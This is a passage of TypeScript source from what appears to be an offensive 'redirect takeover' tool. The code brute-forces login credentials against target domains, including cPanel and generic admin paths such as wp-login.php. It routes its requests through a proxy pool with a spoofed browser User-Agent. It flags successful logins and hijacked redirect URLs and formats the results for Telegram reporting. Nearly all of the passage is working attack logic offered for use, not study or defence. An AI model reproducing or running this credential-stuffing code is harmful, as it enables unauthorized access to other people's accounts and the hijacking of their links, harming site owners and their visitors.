        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.id === "cpanel_takeover" || vector.id.includes("cpanel")) {
      attempts = await tryCpanelLogin(
        intelResult.domain,
        vector.credentialsToTry.slice(0, maxCredsPerVector),
        onAttempt,
      );
    } else if (vector.method === "credential_stuffing") {
      // Generic credential stuffing for unknown platforms
      attempts = await tryGenericLogin(
        intelResult.domain,
        vector,
        maxCredsPerVector,
        onAttempt,
      );
    }
    
    allAttempts.push(...attempts);
    
    // Check for successes
    const loginSuccesses = attempts.filter(a => a.success);
    successfulLogins.push(...loginSuccesses);
    
    // Check if redirect was changed
    const redirectSuccess = attempts.find(a => a.newRedirectUrl);
    if (redirectSuccess) {
      redirectChanged = true;
      newRedirectUrl = redirectSuccess.newRedirectUrl!;
      onProgress?.("success", `\n🎯🎯🎯 REDIRECT TAKEOVER SUCCESS!\n   ${vector.name}: ${redirectSuccess.email}\n   New URL: ${newRedirectUrl}`);
      break; // Mission accomplished!
    }
    
    // Report vector result
    if (loginSuccesses.length > 0) {
      onProgress?.("partial", `🔓 ${loginSuccesses.length} login(s) succeeded but redirect not changed yet`);
    } else {
      onProgress?.("failed", `❌ Vector failed: 0/${attempts.length} logins succeeded`);
    }
  }
  
  const totalDurationMs = Date.now() - startTime;
  
  // Build summary
  const summaryParts: string[] = [];
  summaryParts.push(`Vectors: ${vectorsAttempted}/${sortedVectors.length}`);
  summaryParts.push(`Attempts: ${allAttempts.length}`);
  summaryParts.push(`Logins: ${successfulLogins.length}`);
  if (redirectChanged) {
    summaryParts.push(`🎯 REDIRECT CHANGED → ${newRedirectUrl}`);
  }
  summaryParts.push(`Time: ${(totalDurationMs / 1000).toFixed(1)}s`);
  
  return {
    totalAttempts: allAttempts.length,
    successfulLogins,
    redirectChanged,
    newRedirectUrl,
    vectorsAttempted,
    totalDurationMs,
    summary: summaryParts.join(" | "),
    attempts: allAttempts,
  };
}

// ═══════════════════════════════════════════════════════
//  GENERIC LOGIN HANDLER
// ═══════════════════════════════════════════════════════

async function tryGenericLogin(
  domain: string,
  vector: TakeoverVector,
  maxCreds: number,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  const credsToTry = vector.credentialsToTry.slice(0, maxCreds);
  
  // Try common admin panel paths
  const adminPaths = [
    "/wp-login.php",
    "/wp-admin/",
    "/admin/",
    "/administrator/",
    "/login",
    "/user/login",
    "/account/login",
  ];
  
  // Find which admin path exists
  let adminUrl: string | null = null;
  for (const path of adminPaths) {
    try {
      const { response } = await fetchWithPoolProxy(`http://${domain}${path}`, {
        redirect: "follow",
      }, { timeout: 8000 });
      
      const body = await response.text().catch(() => "");
      if (response.status === 200 && (body.includes("login") || body.includes("password") || body.includes("username"))) {
        adminUrl = `http://${domain}${path}`;
        break;
      }
    } catch {}
  }
  
  if (!adminUrl) {
    return [{ vectorId: vector.id, vectorName: vector.name, email: "", password: "", success: false, detail: "No admin panel found", durationMs: 0 }];
  }
  
  for (const cred of credsToTry) {
    const start = Date.now();
    onAttempt?.(vector.id, cred.email, "trying", `Generic: ${cred.email}@${adminUrl}`);
    
    try {
      const { response } = await fetchWithPoolProxy(adminUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `username=${encodeURIComponent(cred.email)}&password=${encodeURIComponent(cred.password)}&log=${encodeURIComponent(cred.email)}&pwd=${encodeURIComponent(cred.password)}`,
        redirect: "manual",
      }, { timeout: 15000 });
      
      const status = response.status;
      const location = response.headers.get("location") || "";
      
      // Success indicators
      if ((status === 302 || status === 301) && !location.includes("login") && !location.includes("error")) {
        results.push({
          vectorId: vector.id,
          vectorName: vector.name,
          email: cred.email,
          password: cred.password,
          success: true,
          detail: `Login successful → ${location.substring(0, 60)}`,
          accessType: "admin_panel",
          durationMs: Date.now() - start,
        });
        onAttempt?.(vector.id, cred.email, "success", `✅ Login: ${cred.email}`);
        return results;
      }
      
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Failed (${status})`,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ ${cred.email}`);
    } catch (err: any) {
      results.push({
        vectorId: vector.id,
        vectorName: vector.name,
        email: cred.email,
        password: cred.password,
        success: false,
        detail: `Error: ${err.message?.substring(0, 60)}`,
        durationMs: Date.now() - start,
      });
      onAttempt?.(vector.id, cred.email, "failed", `❌ Error`);
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM FORMATTER
// ═══════════════════════════════════════════════════════

export function formatTakeoverExecutionForTelegram(result: TakeoverExecutionResult): string {
  let msg = "";
  
  if (result.redirectChanged) {
    msg += `🎯🎯🎯 REDIRECT TAKEOVER SUCCESS!\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `✅ Redirect เปลี่ยนเป็น: ${result.newRedirectUrl}\n\n`;
    
    const successAttempt = result.attempts.find(a => a.newRedirectUrl);
    if (successAttempt) {
      msg += `🔑 Account: ${successAttempt.email}\n`;
      msg += `🔓 Access: ${successAttempt.accessType}\n`;
      msg += `📌 Vector: ${successAttempt.vectorName}\n`;
    }
  } else if (result.successfulLogins.length > 0) {
    msg += `🔓 LOGIN SUCCESS (${result.successfulLogins.length} accounts)\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `⚠️ Login สำเร็จแต่ยังเปลี่ยน redirect ไม่ได้\n\n`;
    
    for (const login of result.successfulLogins.slice(0, 5)) {
      msg += `   🔑 ${login.email} (${login.accessType})\n`;
      msg += `      ${login.detail.substring(0, 60)}\n`;
    }
  } else {
    msg += `❌ Takeover Execution: ไม่สำเร็จ\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  }
  
  msg += `\n📊 Stats:\n`;
  msg += `   Vectors tried: ${result.vectorsAttempted}\n`;
  msg += `   Total attempts: ${result.totalAttempts}\n`;
  msg += `   Successful logins: ${result.successfulLogins.length}\n`;
  msg += `   Duration: ${(result.totalDurationMs / 1000).toFixed(1)}s\n`;
  
  // Show failed attempts summary
  const failedAttempts = result.attempts.filter(a => !a.success);
  if (failedAttempts.length > 0 && failedAttempts.length <= 10) {
    msg += `\n❌ Failed attempts:\n`;
    for (const a of failedAttempts.slice(0, 8)) {
      msg += `   • ${a.email}: ${a.detail.substring(0, 50)}\n`;
    }
    if (failedAttempts.length > 8) {
      msg += `   ... +${failedAttempts.length - 8} more\n`;
    }
  }
  
  return msg;
}

// ═══════════════════════════════════════════════════════
//  UTILITIES
// ═══════════════════════════════════════════════════════

function extractShortCode(target: string, service: string): string | null {
  // Extract short code from URL like "https://t.ly/pgw828" → "pgw828"
  try {
    const url = target.startsWith("http") ? target : `https://${target}`;
    const parsed = new URL(url);
    const path = parsed.pathname.replace(/^\//, "").replace(/\/$/, "");
    if (path) return path;
  } catch {}
  
  // Try regex extraction
  const regex = new RegExp(`${service.replace(".", "\\.")}[/]([a-zA-Z0-9_-]+)`, "i");
  const match = target.match(regex);
  return match?.[1] || null;
}

function escapeXml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}
